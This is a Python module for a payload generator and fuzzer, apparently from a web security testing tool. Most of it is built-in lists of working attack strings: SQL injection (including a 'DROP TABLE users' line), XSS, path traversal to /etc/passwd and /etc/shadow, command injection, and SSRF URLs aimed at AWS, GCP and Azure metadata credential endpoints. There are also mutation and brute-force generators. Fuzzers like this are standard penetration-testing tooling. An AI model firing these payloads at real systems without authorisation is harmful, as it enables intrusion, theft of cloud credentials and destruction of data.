"""
Advanced Payload Generator and Fuzzer
Generates intelligent payloads for vulnerability testing
"""

import random
import string
from typing import List, Dict, Any, Generator
from itertools import product
import re
from loguru import logger

try:
    import wfuzz
    WFUZZ_AVAILABLE = True
except ImportError:
    WFUZZ_AVAILABLE = False
    wfuzz = None

try:
    from fuzzywuzzy import fuzz
    FUZZY_AVAILABLE = True
except ImportError:
    FUZZY_AVAILABLE = False
    fuzz = None


class PayloadGenerator:
    """Advanced payload generator for security testing"""
    
    def __init__(self, config=None):
        self.config = config or {}
        self.wordlists = self._load_wordlists()
    
    def _load_wordlists(self) -> Dict[str, List[str]]:
        """Load built-in wordlists for payload generation"""
        wordlists = {
            'sql_injection': [
                # Error-based payloads
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "' AND '1'='1",
                "') AND ('1'='1",
                "'; DROP TABLE users; --",
                "' OR 1=1#",
                "' OR 'x'='x",
                "%' AND 1=1--",
                "' AND 1=2 UNION SELECT NULL--",
                
                # Time-based payloads
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                
                # Boolean-based payloads
                "' AND 1=1--",
                "' AND 1=2--",
                
                # Advanced payloads
                "UNION ALL SELECT NULL,NULL,NULL--",
                "ORDER BY 1--",
                "GROUP BY 1--",
                "HAVING 1=1--",
                "RLIKE (SELECT (CASE WHEN (1=1) THEN 0x61646D696E ELSE 0x61646D696E END))--",
            ],
            
            'xss': [
                # Basic XSS payloads
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
                
                # Advanced XSS payloads
                "javascript:alert('XSS')",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<marquee onstart=alert(1)>",
                "<details ontoggle=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<object data='data:text/html,<script>alert(1)</script>'>",
                "<embed src='data:text/html,<script>alert(1)</script>'>",
                "<math><maction onclick=alert(1)>",
                "<form><button formaction=javascript:alert(1)>",
                
                # Obfuscated payloads
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
                "<svg onload=alert&#40;1&#41;>",
            ],
            
            'directory_traversal': [
                # Basic traversal payloads
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd',
                
                # Advanced traversal payloads
                '../../../../../../../../etc/passwd',
                '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
                '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
                '.././.././.././etc/passwd',
                '..\\\\..\\\\..\\\\windows\\\\win.ini',
                '....\\\\....\\\\....\\\\windows\\\\win.ini',
                '....////....////....////etc/passwd',
                '/etc/passwd%00',
                'c:\\boot.ini',
                '\\\\localhost\\c$\\windows\\win.ini',
                
                # Null byte and encoding variants
                '../../../../../../../../etc/passwd%00',
                '..%2f..%2f..%2f..%2fetc%2fpasswd',
                '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
            ],
            
            'command_injection': [
                # Basic command injection payloads
                '; ls',
                '| ls',
                '& ls',
                
                # Advanced command injection payloads
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '& cat /etc/passwd',
                '; dir',
                '| dir',
                '& dir',
                '; whoami',
                '| whoami',
                '& whoami',
                '`ls`',
                '$(ls)',
                '; ping -c 3 127.0.0.1',
                '| ping -c 3 127.0.0.1',
                '& ping -c 3 127.0.0.1',
                
                # Windows payloads
                '; type C:\\Windows\\win.ini',
                '| type C:\\Windows\\win.ini',
                '& type C:\\Windows\\win.ini',
            ],
            
            'ssrf': [
                # Basic SSRF payloads
                'http://127.0.0.1:22',
                'http://127.0.0.1:25',
                'http://localhost:80',
                'http://localhost:443',
                
                # Cloud metadata payloads
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/user-data/',
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://169.254.169.254/metadata/v1/',
                
                # Advanced SSRF payloads
                'http://169.254.169.254:80/latest/meta-data/',
                'https://169.254.169.254/latest/meta-data/',
                'http://metadata/latest/meta-data/',
                'http://127.0.0.1.xip.io/',
            ]
        }
        
        return wordlists
    
    def generate_fuzz_payloads(self, payload_type: str, count: int = 100) -> List[str]:
        """
        Generate fuzz payloads for testing
        """
        if payload_type not in self.wordlists:
            return []
        
        payloads = self.wordlists[payload_type][:count]
        return payloads
    
    def generate_mutated_payloads(self, base_payload: str, count: int = 50) -> List[str]:
        """
        Generate mutated versions of a base payload
        """
        mutations = []
        
        # Case mutations
        mutations.append(base_payload.upper())
        mutations.append(base_payload.lower())
        mutations.append(base_payload.capitalize())
        
        # Encoding mutations
        mutations.append(base_payload.replace(' ', '%20'))
        mutations.append(base_payload.replace("'", "%27"))
        mutations.append(base_payload.replace('"', '%22'))
        mutations.append(base_payload.replace('<', '%3c'))
        mutations.append(base_payload.replace('>', '%3e'))
        
        # Obfuscation mutations
        if "'" in base_payload:
            mutations.append(base_payload.replace("'", "''"))  # Double single quote
            mutations.append(base_payload.replace("'", "\\'"))  # Escaped single quote
        
        if '"' in base_payload:
            mutations.append(base_payload.replace('"', '""'))  # Double double quote
            mutations.append(base_payload.replace('"', '\\"'))  # Escaped double quote
        
        # Random insertions
        for _ in range(count - len(mutations)):
            mutated = self._random_insertion(base_payload)
            if mutated not in mutations:
                mutations.append(mutated)
        
        return mutations[:count]
    
    def _random_insertion(self, payload: str) -> str:
        """
        Insert random characters into payload for obfuscation
        """
        chars = [' ', '\t', '\n', '\r', '\x00', '\x01', '\x02', '\x03']
        pos = random.randint(0, len(payload))
        char = random.choice(chars)
        return payload[:pos] + char + payload[pos:]
    
    def generate_bruteforce_payloads(self, charset: str = 'alnum', length: int = 4) -> Generator[str, None, None]:
        """
        Generate bruteforce payloads using specified charset
        """
        charsets = {
            'alpha': string.ascii_letters,
            'num': string.digits,
            'alnum': string.ascii_letters + string.digits,
            'special': '!@#$%^&*()_+-=[]{}|;:,.<>?',
            'all': string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?'
        }
        
        selected_charset = charsets.get(charset, charsets['alnum'])
        
        for combination in product(selected_charset, repeat=length):
            yield ''.join(combination)
    
    def generate_pattern_payloads(self, pattern: str, replacements: Dict[str, List[str]]) -> List[str]:
        """
        Generate payloads based on a pattern with replacements
        Example pattern: "admin' {operator} '{value}"
        Replacements: {'{operator}': ['OR', 'AND'], '{value}': ['1=1', '1=1--']}
        """
        payloads = []
        
        # Get all combinations of replacements
        replacement_keys = list(replacements.keys())
        replacement_values = list(replacements.values())
        
        for combination in product(*replacement_values):
            payload = pattern
            for i, key in enumerate(replacement_keys):
                payload = payload.replace(key, combination[i])
            payloads.append(payload)
        
        return payloads
    
    def generate_intelligent_payloads(self, vulnerability_type: str, context: str = "") -> List[str]:
        """
        Generate intelligent payloads based on vulnerability type and context
        """
        payloads = []
        
        if vulnerability_type == 'sql_injection':
            payloads = self._generate_sql_payloads(context)
        elif vulnerability_type == 'xss':
            payloads = self._generate_xss_payloads(context)
        elif vulnerability_type == 'directory_traversal':
            payloads = self._generate_lfi_payloads(context)
        elif vulnerability_type == 'command_injection':
            payloads = self._generate_cmd_payloads(context)
        elif vulnerability_type == 'ssrf':
            payloads = self._generate_ssrf_payloads(context)
        
        return payloads
    
    def _generate_sql_payloads(self, context: str = "") -> List[str]:
        """
        Generate SQL injection payloads based on context
        """
        base_payloads = self.wordlists['sql_injection']
        
        # Context-aware modifications
        if 'mysql' in context.lower():
            base_payloads.extend([
                "' OR 1=1#",
                "' OR '1'='1'#",
                "LIMIT 1 OFFSET 0#",
            ])
        elif 'postgres' in context.lower() or 'postgresql' in context.lower():
            base_payloads.extend([
                "' OR 1=1-- -",
                "'; SELECT pg_sleep(5)--",
                "PG_SLEEP(5)",
            ])
        elif 'mssql' in context.lower() or 'sql server' in context.lower():
            base_payloads.extend([
                "' OR 1=1--",
                "'; WAITFOR DELAY '00:00:05'--",
                "SELECT @@VERSION--",
            ])
        elif 'oracle' in context.lower():
            base_payloads.extend([
                "' OR 1=1--",
                "'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
                "SYS.DUAL--",
            ])
        
        return base_payloads
    
    def _generate_xss_payloads(self, context: str = "") -> List[str]:
        """
        Generate XSS payloads based on context
        """
        base_payloads = self.wordlists['xss']
        
        # Context-aware modifications
        if 'script' in context.lower() or 'javascript' in context.lower():
            base_payloads.extend([
                "<img src=1 onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
            ])
        elif 'html' in context.lower():
            base_payloads.extend([
                "<h1>test</h1>",
                "<p>test</p>",
                "<div>test</div>",
            ])
        elif 'attribute' in context.lower():
            base_payloads.extend([
                '" onmouseover="alert(1)"',
                "' onfocus='alert(1)' autofocus=''",
                '" onload="alert(1)"',
            ])
        
        return base_payloads
    
    def _generate_lfi_payloads(self, context: str = "") -> List[str]:
        """
        Generate LFI/Directory traversal payloads based on context
        """
        base_payloads = self.wordlists['directory_traversal']
        
        # Context-aware modifications
        if 'windows' in context.lower():
            base_payloads.extend([
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\boot.ini',
                '..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini',
            ])
        elif 'linux' in context.lower() or 'unix' in context.lower():
            base_payloads.extend([
                '/etc/shadow',
                '/etc/group',
                '/proc/version',
                '/var/log/auth.log',
                '../../../../../../../../etc/hosts',
            ])
        elif 'apache' in context.lower():
            base_payloads.extend([
                '/etc/apache2/apache2.conf',
                '/etc/httpd/conf/httpd.conf',
                '/var/log/apache2/access.log',
                '/var/log/httpd/access_log',
            ])
        elif 'nginx' in context.lower():
            base_payloads.extend([
                '/etc/nginx/nginx.conf',
                '/usr/local/nginx/conf/nginx.conf',
                '/var/log/nginx/access.log',
            ])
        
        return base_payloads
    
    def _generate_cmd_payloads(self, context: str = "") -> List[str]:
        """
        Generate command injection payloads based on context
        """
        base_payloads = self.wordlists['command_injection']
        
        # Context-aware modifications
        if 'windows' in context.lower():
            base_payloads.extend([
                '; type C:\\Windows\\win.ini',
                '| type C:\\Windows\\win.ini',
                '& type C:\\Windows\\win.ini',
                '; net user',
                '| net user',
                '& net user',
            ])
        elif 'linux' in context.lower() or 'unix' in context.lower():
            base_payloads.extend([
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '& cat /etc/passwd',
                '; id',
                '| id',
                '& id',
                '; uname -a',
                '| uname -a',
                '& uname -a',
            ])
        elif 'php' in context.lower():
            base_payloads.extend([
                '; php -v',
                '| php -v',
                '& php -v',
                '; system("id")',
                '| system("id")',
                '& system("id")',
            ])
        elif 'python' in context.lower():
            base_payloads.extend([
                '; python --version',
                '| python --version',
                '& python --version',
                "; exec('import os; os.system(\"id\")')",
                "| exec('import os; os.system(\"id\")')",
                "& exec('import os; os.system(\"id\")')",
            ])
        
        return base_payloads
    
    def _generate_ssrf_payloads(self, context: str = "") -> List[str]:
        """
        Generate SSRF payloads based on context
        """
        base_payloads = self.wordlists['ssrf']
        
        # Context-aware modifications
        if 'aws' in context.lower() or 'amazon' in context.lower():
            base_payloads.extend([
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data',
                'http://instance-data/latest/meta-data/',
            ])
        elif 'gcp' in context.lower() or 'google' in context.lower():
            base_payloads.extend([
                'http://metadata.google.internal/computeMetadata/v1/project/project-id',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
                'http://169.254.169.254/computeMetadata/v1/',
            ])
        elif 'azure' in context.lower():
            base_payloads.extend([
                'http://169.254.169.254/metadata/instance?api-version=2017-04-02',
                'http://169.254.169.254/metadata/instance/network?api-version=2017-04-02',
            ])
        
        return base_payloads

# Example usage
if __name__ == "__main__":
    generator = PayloadGenerator()
    
    # Generate SQL injection payloads
    sql_payloads = generator.generate_fuzz_payloads('sql_injection', 10)
    print("SQL Injection Payloads:", sql_payloads[:5])
    
    # Generate mutated payloads
    mutated = generator.generate_mutated_payloads("admin' OR '1'='1", 5)
    print("Mutated Payloads:", mutated)
    
    # Generate pattern payloads
    pattern_payloads = generator.generate_pattern_payloads(
        "admin' {operator} '{value}",
        {
            '{operator}': ['OR', 'AND'],
            '{value}': ['1=1', '1=1--']
        }
    )
    print("Pattern Payloads:", pattern_payloads)